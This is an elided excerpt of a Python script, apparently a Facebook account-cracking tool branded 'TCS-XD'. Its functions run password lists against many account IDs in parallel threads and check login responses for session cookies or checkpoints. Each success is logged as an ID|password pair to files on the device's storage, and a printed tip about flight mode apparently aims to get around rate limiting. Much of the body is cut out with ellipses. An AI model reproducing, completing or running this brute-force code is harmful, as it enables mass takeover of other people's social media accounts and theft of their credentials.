...
def public():
        ...
        for met in range(jum):
                ...
                usrr.append(kl)
        linex()
        print(' All method activated try 1 by 1 ')
        linex()
        ...
        try:
                ...
                with tred(max_workers=30) as crack_submit:
                        ...
                        print("\033[1;37m \x1b[38;5;208mACTIVATE FLIGHT MODE FOR BETTER RESULT\033[1;37m")
                        linex()
                        for user in id:
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [TCS-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [TCS-OK] %s | %s'%(ids,pas))
                                open('/sdcard/TCS-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [TCS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TCS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [TCS-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/TCS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
                ...
                try:
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/TCS-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [TCS-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/TCS-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [TCS-OK] '+uid+' | '+pas+'\033[1;97m')
